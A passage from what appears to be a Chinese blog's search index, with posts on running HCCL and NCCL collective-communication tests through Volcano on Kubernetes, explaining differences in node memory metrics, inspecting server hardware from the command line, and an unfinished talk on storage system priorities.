5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: batch.volcano.sh/v1alpha1 kind: Job metadata: name: hccl-test spec: minAvailable: $HCCL_TEST_NODES schedulerName: volcano queue: default priorityClassName: extreme-high-priority-preempting policies: - event: PodEvicted action: RestartJob plugins: env: [] svc: [] ssh: [] tasks: - replicas: $HCCL_TEST_NODES name: hccl-test policies: - event: TaskCompleted action: CompleteJob template: metadata: labels: app: hccl-test spec: containers: - command: - /bin/sh - -c - | mkdir -p /var/run/sshd; /usr/sbin/sshd; sleep infinity image: $HCCL_TEST_IMAGE imagePullPolicy: Always name: hccl-test resources: requests: cpu: 1 huawei.com/Ascend910: 16 limits: huawei.com/Ascend910: 16 nodeSelector: hccl-test: \u0026#34;true\u0026#34; affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: app operator: In values: - hccl-test topologyKey: \u0026#34;kubernetes.io/hostname\u0026#34; EOF 3. 运行 hccl-test 查看 Pod 状态 1 2 3 4 5 6 kubectl get pod -l app=hccl-test -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES hccl-test-hccl-test-0 1/1 Running 0 7m19s 10.244.53.163 ascend-910b-02 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hccl-test-hccl-test-1 1/1 Running 0 7m19s 10.244.54.38 ascend-910b-01 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; hccl-test-hccl-test-2 1/1 Running 0 7m19s 10.244.52.160 ascend-910b-03 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 进入 Pod 1 kubectl exec -it hccl-test-hccl-test-0 bash 单机测试 1 2 3 4 export HCCL_RDMA_TC=100 export HCCL_RDMA_SL=3 export HCCL_BUFFSIZE=2048 mpirun -n 16 /usr/local/Ascend/ascend-toolkit/latest/tools/hccl_test/bin/all_reduce_test -b 8K -e 64M -f 2 -d fp32 -o sum -p 16 多节点 1 2 3 4 5 export HCCL_RDMA_TC=100 export HCCL_RDMA_SL=3 export HCCL_BUFFSIZE=2048 mpirun -n 32 -hosts hccl-test-hccl-test-0.hccl-test:16,hccl-test-hccl-test-0.hccl-test:16,hccl-test-hccl-test-0.hccl-test:16 all_reduce_test -b 8K -e 4G -f 2 -d fp32 -o sum -p 16 -c 0 4. 清理环境 1 kubectl delete job.batch.volcano.sh hccl-test ","description":"","id":37,"section":"post","tags":["博文","Volcano","HCCL","Ascend","AI","测试"],"title":"使用 Volcano 运行 hccl-test","uri":"https://www.chenshaowen.com/blog/use-volcano-to-run-hccl-test.html"},{"content":"1. 制作 nccl-test 镜像 查看 CUDA 版本 1 2 3 nvidia-smi | grep \u0026#34;CUDA Version\u0026#34; | awk \u0026#39;{print $9}\u0026#39; 12.2 编写 Dockerfile 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 cat \u0026gt; Dockerfile \u0026lt;\u0026lt; EOF FROM hubimage/nvidia-cuda:12.1.0-cudnn8-devel-ubuntu22.04 ENV DEBIAN_FRONTEND=noninteractive ARG CONDA_VERSION WORKDIR /workspace ENV DEBIAN_FRONTEND=noninteractive RUN apt-get update \u0026amp;\u0026amp; apt install -y openmpi-bin libopenmpi-dev ssh openssh-server net-tools vim git iputils-ping nfs-common RUN git clone https://github.com/NVIDIA/nccl-tests.git \u0026amp;\u0026amp; \\ cd nccl-tests \u0026amp;\u0026amp; \\ make MPI=1 MPI_HOME=/usr/lib/x86_64-linux-gnu/openmpi EOF 编译 nccl-test 镜像 1 docker build -t hubimage/nccl-test:12.1.0-ubuntu22.04 -f Dockerfile . 推送 nccl-test 镜像 1 docker push hubimage/nccl-test:12.1.0-ubuntu22.04 2. 运行 Volcano Job 给测试节点打上标签 1 2 3 kubectl label node node-a100-15 nccl-test=true kubectl label node node-a100-16 nccl-test=true kubectl label node node-a100-31 nccl-test=true 创建 Volcano Job 1 2 export NCCL_TEST_IMAGE=hubimage/nccl-test:12.1.0-ubuntu22.04 export NCCL_TEST_NODES=3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: batch.volcano.sh/v1alpha1 kind: Job metadata: name: nccl-test spec: minAvailable: $NCCL_TEST_NODES schedulerName: volcano queue: default policies: - event: PodEvicted action: RestartJob plugins: env: [] svc: [] ssh: [] tasks: - replicas: $NCCL_TEST_NODES name: nccl-test policies: - event: TaskCompleted action: CompleteJob template: metadata: labels: app: nccl-test spec: containers: - command: - /bin/sh - -c - | mkdir -p /var/run/sshd; /usr/sbin/sshd; sleep infinity image: $NCCL_TEST_IMAGE imagePullPolicy: Always name: nccl-test resources: requests: cpu: 1 nodeSelector: nccl-test: \u0026#34;true\u0026#34; affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: app operator: In values: - nccl-test topologyKey: \u0026#34;kubernetes.io/hostname\u0026#34; EOF 3. 运行 nccl-test 查看 Pod 状态 1 2 3 4 5 6 kubectl get pod -l app=nccl-test -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES nccl-test-nccl-test-0 1/1 Running 0 7m3s 10.244.39.166 node-a100-31 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nccl-test-nccl-test-1 1/1 Running 0 7m3s 10.244.201.46 node-a100-15 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nccl-test-nccl-test-2 1/1 Running 0 7m 10.244.39.185 node-a100-31 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 进入 Pod 1 kubectl exec -it nccl-test-nccl-test-0 bash 配置环境变量 1 export NCCL_TEST_GPUS=8 1 2 3 4 5 6 7 8 9 10 11 12 mpirun --allow-run-as-root -np $VC_NCCL_TEST_NUM --host $VC_NCCL_TEST_HOSTS /workspace/nccl-tests/build/all_reduce_perf -b 8M -e 128M -f 2 -g ${NCCL_TEST_GPUS} -t 1 -a 2 -n 50 # out-of-place in-place # size count type redop root time algbw busbw #wrong time algbw busbw #wrong # (B) (elements) (us) (GB/s) (GB/s) (us) (GB/s) (GB/s) 8388608 2097152 float sum -1 103954 0.08 0.15 0 113322 0.07 0.14 0 16777216 4194304 float sum -1 135988 0.12 0.24 0 108949 0.15 0.30 0 33554432 8388608 float sum -1 117689 0.29 0.55 0 122374 0.27 0.53 0 67108864 16777216 float sum -1 227753 0.29 0.56 0 227060 0.30 0.57 0 134217728 33554432 float sum -1 479106 0.28 0.54 0 476898 0.28 0.54 0 # Out of bounds values : 0 OK # Avg bus bandwidth : 0.410777 mpirun 命令参数说明：\n--allow-run-as-root: 允许使用 root 运行程序\nnp: 执行的总进程数量，这里一个节点一个进程，因此就是节点的数量\nhost: 运行程序的节点列表\nall_reduce_perf 参数说明：\n-b: 开始的数据大小\n-e: 结束的数据大小\n-f: 每次增加的倍数\n-g: 每个进程的 GPU 数量\n-t: 每个进程的线程数量\n-a: 在所有 ranks 计算均值作为最终结果 (MPI=1 only). \u0026lt;0=Rank0,1=Avg,2=Min,3=Max\u0026gt;. 默认为 1.\n-n: 每次操作（一次发送）循环多少次\n此外还可以配置 -x NCCL_SOCKET_IFNAME=eth0 -x NCCL_P2P_LEVEL=NVL -x LD_LIBRARY_PATH -x PATH -x NCCL_NET_GDR_LEVEL=4 等通信参数，测试 NVLink、IB 网卡的带宽。\n4. 清理环境 1 kubectl delete job.batch.volcano.sh nccl-test 5. 相关问题与解决 invalid device ordinal 报错\n1 2 3 nccl-test-nccl-test-1: Test CUDA failure common.cu:622 \u0026#39;invalid device ordinal\u0026#39; .. nccl-test-nccl-test-1 pid 717: Test failure common.cu:1078 .. nccl-test-nccl-test-1 pid 717: Test failure common.cu:891 没有足够可用 GPU 卡，需要减少 -g 参数。\n","description":"","id":38,"section":"post","tags":["博文","Volcano","NCCL","Nvidia","AI","测试"],"title":"使用 Volcano 运行 nccl-test","uri":"https://www.chenshaowen.com/blog/use-volcano-to-run-nccl-test.html"},{"content":"1. top 查看节点资源使用率超过 100% 1 2 3 4 5 6 kubectl top node NAME CPU(cores) CPU% MEMORY(bytes) MEMORY% master-1 995m 16% 13760Mi 118% master-2 827m 13% 10672Mi 92% master-3 889m 14% 10244Mi 88% 这是由于在计算使用率时，默认使用的是可分配的资源，排除了 Kubelet 保留的部分。在 kubectl 源码中可以看到:\n1 2 3 4 5 6 7 for _, n := range nodes { if !o.ShowCapacity { availableResources[n.Name] = n.Status.Allocatable } else { availableResources[n.Name] = n.Status.Capacity } } 如果需要查看节点总的资源使用情况，可添加 --show-capacity 参数:\n1 2 3 4 5 6 kubectl top node --show-capacity NAME CPU(cores) CPU% MEMORY(bytes) MEMORY% master-1 1161m 14% 13822Mi 87% master-2 998m 12% 10640Mi 67% master-3 877m 10% 10298Mi 65% 实际上 Allocatable 和 Capacity 在节点对象上可以直接看到:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 kubectl get node master-1 -oyaml ... status: allocatable: cpu: \u0026#34;6\u0026#34; ephemeral-storage: \u0026#34;284333649859\u0026#34; hugepages-1Gi: \u0026#34;0\u0026#34; hugepages-2Mi: \u0026#34;0\u0026#34; memory: 11877928Ki pods: \u0026#34;110\u0026#34; capacity: cpu: \u0026#34;8\u0026#34; ephemeral-storage: 308521756Ki hugepages-1Gi: \u0026#34;0\u0026#34; hugepages-2Mi: \u0026#34;0\u0026#34; memory: 16174632Ki pods: \u0026#34;110\u0026#34; 在 Kubelet 的配置文件 /var/lib/kubelet/config.yaml 或者启动命令参数 --system-reserved=cpu=1,memory=2Gi --kube-reserved=cpu=1,memory=2Gi 可以查看具体的资源预留额度。详情可以参考 https://kubernetes.io/zh-cn/docs/tasks/administer-cluster/reserve-compute-resources/ 。\nAllocatable = Capacity - Reserved - Evicted Threshold(驱逐容忍度)，其中 Evicted Threshold 根据不同资源，通常为一个很小的数值或比例。\n2. top node 与 Grafana 数据不一致 2.1 free 与 node_memory_Mem 同源 使用 free 查看节点资源使用情况如下:\n1 2 3 4 free -h total used free shared buff/cache available Mem: 503Gi 62Gi 243Gi 12Gi 198Gi 426Gi Swap: 0B 0B 0B Grafana 节点资源使用情况如下:\n使用的 PromQL 为:\n总内存, node_memory_MemTotal_bytes{instance=~\\\u0026quot;$node\\\u0026quot;} 已用, node_memory_MemTotal_bytes{instance=~\\\u0026quot;$node\\\u0026quot;} - node_memory_MemAvailable_bytes{instance=~\\\u0026quot;$node\\\u0026quot;} 从数值上看，free 与 Grafana 数据基本一致。\n因为 Grafana 使用的 Node Exporter 采集的 node_memory_Mem 这些指标来自主机的 /proc/meminfo 与 free -h 的数据同源。\n2.2 top 使用的是 metrics-server 采集的指标 top 查看节点资源使用情况\n1 2 3 kubectl top node my-node-name NAME CPU(cores) CPU% MEMORY(bytes) MEMORY% my-node-name 4809m 8% 132883Mi 25% 模拟 top 命令向 metrics-server 请求数据:\n1 2 3 4 5 6 7 8 9 10 kubectl get --raw /apis/metrics.k8s.io/v1beta1/nodes/my-node-name { \u0026#34;kind\u0026#34;: \u0026#34;NodeMetrics\u0026#34;, \u0026#34;window\u0026#34;: \u0026#34;10.292s\u0026#34;, \u0026#34;usage\u0026#34;: { \u0026#34;cpu\u0026#34;: \u0026#34;5094380203n\u0026#34;, \u0026#34;memory\u0026#34;: \u0026#34;136278224Ki\u0026#34; } } 这里的内存使用量约 130 Gi，130 / 503 = 25.8% 与 kubectl top node 基本一致。\n2.3 metrics-server 的数据来自 Kubelet 从 metrics-server 的源码可以看到，其在请求 Kubelet 的数据。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 func (kc *kubeletClient) GetMetrics(ctx context.Context, node *corev1.Node) (*storage.MetricsBatch, error) { port := kc.defaultPort path := \u0026#34;/metrics/resource\u0026#34; nodeStatusPort := int(node.Status.DaemonEndpoints.KubeletEndpoint.Port) if kc.useNodeStatusPort \u0026amp;\u0026amp; nodeStatusPort != 0 { port = nodeStatusPort } if metricsPath := node.Annotations[AnnotationResourceMetricsPath]; metricsPath != \u0026#34;\u0026#34; { path = metricsPath } addr, err := kc.addrResolver.NodeAddress(node) if err != nil { return nil, err } url := url.URL{ Scheme: kc.scheme, Host: net.JoinHostPort(addr, strconv.Itoa(port)), Path: path, } return kc.getMetrics(ctx, url.String(), node.Name) } 模拟 metrics-server 向 Kubelet 请求数据\n1 2 3 4 5 6 7 8 kubectl get --raw /api/v1/nodes/my-node-name/proxy/metrics/resource |grep node_ # HELP node_cpu_usage_seconds_total [ALPHA] Cumulative cpu time consumed by the node in core-seconds # TYPE node_cpu_usage_seconds_total counter node_cpu_usage_seconds_total 1.2683530100816046e+08 1721957059813 # HELP node_memory_working_set_bytes [ALPHA] Current working set of the node in bytes # TYPE node_memory_working_set_bytes gauge node_memory_working_set_bytes 1.39524251648e+11 1721957059813 符合预期，请求 metrics-server 与 Kubelet API 提供的监控数据相同。\n2.4 node_memory_working_set_bytes 指标有什么不同 top 使用的是 node_memory_working_set_bytes，是 Kubelet 提供的指标 包括当前正在使用的内存，活跃的缓存，不包括可以被立即回收的缓存、缓冲区，主要是非活跃的文件缓存，其数据来源于 /sys/fs/cgroup。\nGrafana 使用的是 node_memory_MemTotal_bytes - node_memory_MemAvailable_bytes，是 Node Exporter 提供的指标 包括当前正在使用的内存，但不包括缓存，其数据来源于 /proc/meminfo。\n前面可以看到 top 看到的内存使用量大约为 130 Gi，而 Grafana 看到的内存使用量大约是 77 Gi，相差 53 Gi 内存存储的就是一些不能立即被回收的缓存。但由于这两种方式的数据源不同，无法对 53 Gi 进行更详细的分析。\n2.5 Kubelet limit 使用的是 container_memory_working_set_bytes 对于 Pod 来说，通过 top 和 Grafana 看到的内存使用量可能是相同的，因为，大部分 Grafana 面板绘制 Pod 内存使用量用的是 container_memory_working_set_bytes，这与 top 的计算方式是一致的。\n这里需要重点关注的是 Kubelet 会以哪个指标驱逐 Pod? 答案是，container_memory_working_set_bytes 。\ncontainer_memory_working_set_bytes 更能代表容器的真实内存使用量。\n下面这张图体现的是 container_memory_working_set_bytes (大约 18GiB) 与 container_memory_usage_bytes (大约 33GiB) 的区别。\n3. 总结 本文采集数据的主机内核版本为 5.4.0-48-generic，主要内容如下:\n因为 Kubelet 预留资源，top node 资源使用率可能超过 100%，使用 --show-capacity 可以看到总的资源使用情况 常用的节点资源使用率 (node_memory_MemTotal_bytes - node_memory_MemAvailable_bytes)/ node_memory_MemTotal_bytes ，因为忽略了活跃的缓存资源，所以使用率会比 top node 看到的低一些。在上面例子中，Grafana 展示的是 15% 使用率，top node 展示的是 28%。 Kubelet 对 Pod 驱逐使用的是 container_memory_working_set_bytes，与 top pod 看到的内存使用量相同 ","description":"","id":39,"section":"post","tags":["博文","监控","内存","Kubernetes"],"title":"为什么 top node、free、Grafana 的数据对不上","uri":"https://www.chenshaowen.com/blog/why-top-node-free-grafana-data-not-match.html"},{"content":"1. 查看 CPU 查看 CPU 型号 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 lscpu Architecture: x86_64 CPU op-mode(s): 32-bit, 64-bit Byte Order: Little Endian Address sizes: 46 bits physical, 57 bits virtual CPU(s): 160 # 有 160 个 CPU On-line CPU(s) list: 0-159 Thread(s) per core: 2 # 每个核心支持 2 个线程 Core(s) per socket: 40 Socket(s): 2 NUMA node(s): 2 Vendor ID: GenuineIntel CPU family: 6 Model: 106 Model name: Intel(R) Xeon(R) Platinum 8380 CPU @ 2.30GHz Stepping: 6 CPU MHz: 3000.000 # 当前工作频率为 3000 MHz BogoMIPS: 4600.00 Virtualization: VT-x L1d cache: 3.8 MiB L1i cache: 2.5 MiB L2 cache: 100 MiB L3 cache: 120 MiB 如果当前的工作频率低于标称工作频率，则有可能是 CPU 没有处于高性能模式。\n2. 查看内存 内存使用及大小 1 2 3 4 free -h total used free shared buff/cache available Mem: 1.0Ti 319Gi 284Gi 9.2Gi 403Gi 673Gi Swap: 0B 0B 0B 内存条型号 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 dmidecode -t memory Physical Memory Array Location: System Board Or Motherboard Use: System Memory Error Correction Type: Single-bit ECC Maximum Capacity: 12 TB # 支持的最大内存容量为 12 TB Error Information Handle: Not Provided Number Of Devices: 32 # 当前插入了 32 个内存条 # 下面是每个内存条的详细信息 Handle 0x0058, DMI type 17, 92 bytes Memory Device Array Handle: 0x0057 Error Information Handle: Not Provided Total Width: 72 bits Data Width: 64 bits Size: 32 GB # 单个内存条的大小 Form Factor: DIMM Set: None Locator: CPU0_C0D0 Bank Locator: NODE 0 Type: DDR4 # 内存条的类型 Type Detail: Synchronous Registered (Buffered) Speed: 3200 MT/s Manufacturer: Samsung # 供应商 Serial Number: H0GE000240426DAE90 Asset Tag: 042240 Part Number: M393A4K40EB3-CWE Rank: 2 Configured Memory Speed: 3200 MT/s # 每秒传输的次数 Minimum Voltage: 1.2 V Maximum Voltage: 1.2 V Configured Voltage: 1.2 V Memory Technology: DRAM Memory Operating Mode Capability: Volatile memory Firmware Version: 0000 Module Manufacturer ID: Bank 1, Hex 0xCE Module Product ID: Unknown Memory Subsystem Controller Manufacturer ID: Unknown Memory Subsystem Controller Product ID: Unknown Non-Volatile Size: None Volatile Size: 32 GB Cache Size: None Logical Size: None ... 内存带宽 = 3200 MT/s x 64/8 Byte = 25600 MB/s = 25 GB/s\n3. 查看磁盘 查看磁盘挂载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 lsblk -o NAME,TYPE,SIZE,MODEL,UUID,MOUNTPOINT NAME TYPE SIZE MODEL UUID MOUNTPOINT loop0 loop 63.9M /snap/core20/2105 loop1 loop 63.9M /snap/core20/2318 loop3 loop 87M /snap/lxd/28373 loop4 loop 38.7M /snap/snapd/21465 loop5 loop 38.8M /snap/snapd/21759 loop6 loop 87M /snap/lxd/29351 sda disk 446.6G MR9560-8i ├─sda1 part 2M ├─sda2 part 3.8G ff254d69-c5ca-4766-84e9-99925a81d97e /boot └─sda3 part 442.8G 05d3b075-25a6-427d-b5f1-5947f93bebca / nvme0n1 disk 14T INTEL SSDPF2NV153TZ d7e9389d-3a71-447d-9d2f-9544a85de5e3 /data nvme1n1 disk 14T INTEL SSDPF2NV153TZ d73c1906-7bc1-411e-92a8-a737ee16adae /data1 ROTA 为 0 表示 SSD，为 1 表示 HDD。这里也有产品的型号，比如 INTEL SSDPF2NV153TZ，可以用来搜索详细的参数信息。\n查看磁盘使用率 1 2 3 4 5 6 df -H | grep -vE \u0026#39;^Filesystem|tmpfs|cdrom|loop|udev\u0026#39; | awk \u0026#39;{ print $5 \u0026#34;/\u0026#34; $2 \u0026#34; \u0026#34; $1 }\u0026#39; |grep \u0026#34; \u0026#34;/ 12%/468G /dev/sda3 1%/16T /dev/nvme1n1 1%/16T /dev/nvme0n1 9%/4.0G /dev/sda2 查看磁盘速度 1 hdparm -t /dev/sda3 4. 查看 PCI 带宽 找到设备的 PCI ID 这里以磁盘为例\n1 2 3 4 5 6 7 lspci | grep -iE \u0026#34;SATA|SAS|NVM Express|NVMe\u0026#34; 00:17.0 SATA controller: Intel Corporation Device 1ba2 (rev 11) 00:18.0 SATA controller: Intel Corporation Device 1bf2 (rev 11) 1a:00.0 Non-Volatile memory controller: Intel Corporation NVMe DC SSD [3DNAND, Sentinel Rock Controller] 3a:00.0 Non-Volatile memory controller: Intel Corporation NVMe DC SSD [3DNAND, Sentinel Rock Controller] a6:00.0 RAID bus controller: Broadcom / LSI MegaRAID 12GSAS/PCIe Secure SAS39xx 根据 ID 查看带宽 1 2 lspci -vv -s 1a:00.0 |grep -i \u0026#34;LnkCap:\u0026#34; LnkCap:\tPort #0, Speed 16GT/s, Width x4, ASPM L0s L1, Exit Latency L0s \u0026lt;512ns, L1 \u0026lt;16us 这块 NVMe 设备的 PCI 带宽为 16GT/s * 4/8 Byte = 8 GB/s\n下面是一张速查表\n版本 推出年份 Line 编码 每通道传输率 带宽（每个方向） 1.0 2003 8b/10b 2.5 GT/s x1: 0.250 GB/s x2: 0.500 GB/s x4: 1.000 GB/s x8: 2.000 GB/s x16: 4.000 GB/s 2.0 2007 8b/10b 5.0 GT/s x1: 0.500 GB/s x2: 1.000 GB/s x4: 2.000 GB/s x8: 4.000 GB/s x16: 8.000 GB/s 3.0 2010 128b/130b 8.0 GT/s x1: 0.985 GB/s x2: 1.969 GB/s x4: 3.938 GB/s x8: 7.877 GB/s x16: 15.754 GB/s 4.0 2017 128b/130b 16.0 GT/s x1: 1.969 GB/s x2: 3.938 GB/s x4: 7.877 GB/s x8: 15.754 GB/s x16: 31.508 GB/s 5.0 2019 128b/130b 32.0 GT/s x1: 3.938 GB/s x2: 7.877 GB/s x4: 15.754 GB/s x8: 31.508 GB/s x16: 63.015 GB/s 6.0 2021 242B/256B 64.0 GT/s x1: 7.563 GB/s x2: 15.125 GB/s x4: 30.250 GB/s x8: 60.500 GB/s x16: 121.000 GB/s 5. 查看网卡设备 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 lshw -class network -C network *-network:0 description: Ethernet interface product: MT2894 Family [ConnectX-6 Lx] vendor: Mellanox Technologies physical id: 0 bus info: pci@0000:26:00.0 logical name: eth0 version: 00 serial: a0:88:c2:3a:23:90 capacity: 25Gbit/s width: 64 bits clock: 33MHz capabilities: pciexpress vpd msix pm bus_master cap_list rom ethernet physical fibre 1000bt-fd 10000bt-fd 25000bt-fd autonegotiation configuration: autonegotiation=on broadcast=yes driver=mlx5_core driverversion=23.10-0.5.5 duplex=full firmware=26.36.1010 (MT_0000000546) latency=0 link=yes multicast=yes port=fibre slave=yes resources: iomemory:fff0-ffef irq:16 memory:ffff0000000-ffff1ffffff memory:a6a00000-a6afffff memory:ffff2800000-ffff2ffffff *-network:1 description: Ethernet interface product: MT2894 Family [ConnectX-6 Lx] vendor: Mellanox Technologies physical id: 0.1 bus info: pci@0000:26:00.1 logical name: eth1 version: 00 serial: a0:88:c2:3a:23:90 capacity: 25Gbit/s width: 64 bits clock: 33MHz capabilities: pciexpress vpd msix pm bus_master cap_list rom ethernet physical fibre 1000bt-fd 10000bt-fd 25000bt-fd autonegotiation configuration: autonegotiation=on broadcast=yes driver=mlx5_core driverversion=23.10-0.5.5 duplex=full firmware=26.36.1010 (MT_0000000546) latency=0 link=yes multicast=yes port=fibre slave=yes resources: iomemory:fff0-ffef irq:17 memory:fffee000000-fffefffffff memory:a6900000-a69fffff memory:ffff2000000-ffff27fffff 说明机器上有两个网卡，速度都是 25Gbit/s。\n6. 查看 IB 网卡设备 列出所有 IB 网卡 1 2 3 4 5 6 7 ibdev2netdev mlx5_0 port 1 ==\u0026gt; ibs10 (Up) mlx5_1 port 1 ==\u0026gt; ibs11 (Up) mlx5_4 port 1 ==\u0026gt; ibs18 (Up) mlx5_5 port 1 ==\u0026gt; ibs19 (Up) mlx5_bond_0 port 1 ==\u0026gt; bond1 (Up) 表示有 5 个 IB 网卡，并且都处于工作状态。\n查看网卡的速度 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ibstat CA \u0026#39;mlx5_5\u0026#39; CA type: MT4123 Number of ports: 1 Firmware version: 20.35.1012 Hardware version: 0 Node GUID: 0x946dae03008bc71c System image GUID: 0x946dae03008bc71c Port 1: State: Active Physical state: LinkUp Rate: 200 Base lid: 118 LMC: 0 SM lid: 1 Capability mask: 0xa651e848 Port GUID: 0x946dae03008bc71c Link layer: InfiniBand 其中，Rate 为 200 表示速度为 200 Gbit/s\n7. 查看加速设备 查看 GPU 显卡 1 2 3 4 5 6 7 8 9 10 nvidia-smi -L GPU 0: NVIDIA A800-SXM4-80GB (UUID: GPU-ace08757-67d5-1c00-2885-56bffc0f9199) GPU 1: NVIDIA A800-SXM4-80GB (UUID: GPU-a7f1053a-5d92-1d5a-2d65-621c95fb228d) GPU 2: NVIDIA A800-SXM4-80GB (UUID: GPU-96effe18-1cee-e4b0-7120-3961ced74d58) GPU 3: NVIDIA A800-SXM4-80GB (UUID: GPU-5b9a3601-4690-8fd7-baff-c2086e984e01) GPU 4: NVIDIA A800-SXM4-80GB (UUID: GPU-3636db36-51b8-7209-79e6-cc05b5acb6ea) GPU 5: NVIDIA A800-SXM4-80GB (UUID: GPU-e67ab276-2d74-30fc-6e97-79e0da803bb0) GPU 6: NVIDIA A800-SXM4-80GB (UUID: GPU-b6a8e448-5b04-517d-5daa-6c9457e116f0) GPU 7: NVIDIA A800-SXM4-80GB (UUID: GPU-9a128cae-7f75-e8f2-1c75-2b16ccacb4b8) 查看 NPU 显卡 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 npu-smi info +------------------------------------------------------------------------------------------------+ | npu-smi 23.0.2.1 Version: 23.0.2.1 | +---------------------------+---------------+----------------------------------------------------+ | NPU Name | Health | Power(W) Temp(C) Hugepages-Usage(page)| | Chip | Bus-Id | AICore(%) Memory-Usage(MB) HBM-Usage(MB) | +===========================+===============+====================================================+ | 0 910B2C | OK | 384.6 79 0 / 0 | | 0 | 0000:5A:00.0 | 69 0 / 0 61544/ 65536 | +===========================+===============+====================================================+ | 1 910B2C | OK | 400.3 80 0 / 0 | | 0 | 0000:19:00.0 | 70 0 / 0 60765/ 65536 | +===========================+===============+====================================================+ | 2 910B2C | OK | 384.9 75 0 / 0 | | 0 | 0000:49:00.0 | 68 0 / 0 60766/ 65536 | +===========================+===============+====================================================+ | 3 910B2C | OK | 387.4 80 0 / 0 | | 0 | 0000:39:00.0 | 71 0 / 0 60765/ 65536 | +===========================+===============+====================================================+ | 4 910B2C | OK | 368.9 76 0 / 0 | | 0 | 0000:DA:00.0 | 69 0 / 0 60765/ 65536 | +===========================+===============+====================================================+ ","description":"","id":40,"section":"post","tags":["博文","服务器","设备","运维"],"title":"如何查看服务器上的设备信息","uri":"https://www.chenshaowen.com/blog/how-to-get-device-information-on-server.html"},{"content":" 本文内容整理自我在一次内部分享的部分内容。\n1. 存储系统的核心要素 1.1 安全 对象存储桶的凭证、使用存储 PVC 时的授权、对访问来源的控制，这些都是安全需要关注的问题。\n但这些又非常容易被忽视，出了问题就是大问题。\n1.2 生命周期管理 存储系统是为业务使用数据服务的。\n业务对数据的生命周期管理，直接影响着存储系统功能上的需求。\n数据的产生-清洗-使用-流转-归档，这些流程的背后都需要存储系统及各种组件的支持。\n1.3 性能 性能是衡量存储系统的重要指标。各种存储系统中，吞吐、延时、IOPS，这些都是我们需要关注的性能指标。\n通过 dd、fio 等工具，我们可以评估各种存储系统的性能。然后，去调优，去修改参数、去提升带宽，以达到最佳性能。\n1.4 存储成本 成本能最直接影响决策者的存储选择。\n通常，性能越好，存储需要付出的成本越高，而实际需求需要我们自行评估，在性能与成本之间做出平衡决策。\n对于很多公司来说，存储成本会占到整个 IT 成本的很大一部分。因此，对大规模使用的存储服务都非常敏感，决策时也会多一层非技术侧的考虑。\n1.5 运维成本 由于基础设施的急剧变化，传统的存储系统不一定适合云原生的应用场景。这些存储在 Kubernetes 上使用和运维成本很高，有时，甚至部署这些存储系统也很困难。\n适配云原生的存储系统，可能只需要执行一条 helm install 命令就可以完成部署，而且具有良好的可观测性，自愈的特性，这些不是每一个存储系统都具有的。\n同时，日常繁琐的业务配置，也非常消耗运维同学的精力和时间，如何降低人力的成本是一个挑战。\n2. 存储建设所处的阶段 我们总能找到很多的最佳实践，得到很多的参考建议，但直接按部就班的落地，会困难重重、甚至引发众怒。\n这些最佳实践说得对，我们做得也很努力，就是得不到好的结果。因为，所处的阶段不同、人力投入不同、业务形态不同，很多总结最佳实践的人可能自己都忽略掉了这些因素。\n成功的总结不是成功的全部，而是其自认为困难的部分。\n对存储系统的阶段进行分析，能够准确识别当前最迫切需要关注的问题。\n2.1 早期: 运维成本、性能 在项目的早期，从 0 到 1 ，我们并不会考虑太多，只要能快速实现就行，项目着急上线。\n这个阶段主要是依赖人工进行运维和配置，运维同学的意见比决策者的意见更重要。\n只要性能够好、方便配置，就能先落地试试，其他问题优先级比较低。\n2.2 中期: 存储成本、生命周期管理 经过一段时间的试验，大家会对存储的一些特性有所了解，会有很多想要去优化和调整的地方。\n而存储规模越来越大，存储成本越来越高，来自老板的压力也越来越大。同时，各种业务功能，跨产品、跨团队的存储、流转需求，也导致存储系统的复杂性升高，推高了维护成本。\n此时，最大问题就是要根据数据的冷热分层，根据不同需求对性能的不同要求去降低存储成本。通过 Fluid 等组件对数据进行管理，以应对上层的业务需求。\n2.3 后期: 安全，生命周期管理 开始关注数据安全时，存储的规模应该很大了，同时功能上的建设应该也很完善。\n数据安全是绕不开的一个问题，其潜藏着巨大的风险。一次大的安全事故，就可能直接导致前面所有的努力白费，甚至相关人员直接离职。\n怎样才能避免这些风险是后期迫切需要考虑的问题。\n3. 存储系统的演进方向 3.1 面向对象存储的数据交付 目前我们的工作方式是，训练和推理平台直接在 JuiceFS 中共享、拷贝数据。当前的问题是:\nJuiceFS 存储空间有限，虽然我们购买了 1P、500TB 的企业版存储，但还是不够用 JuiceFS 成本比对象存储高 JuiceFS 中的数据缺少生命周期管理 而面向对象存储的数据交付，强调的是在交付过程中，我们要对数据进行归档、封板。数据平台、训练平台、推理平台的数据交付，应该基于对象存储，而不是 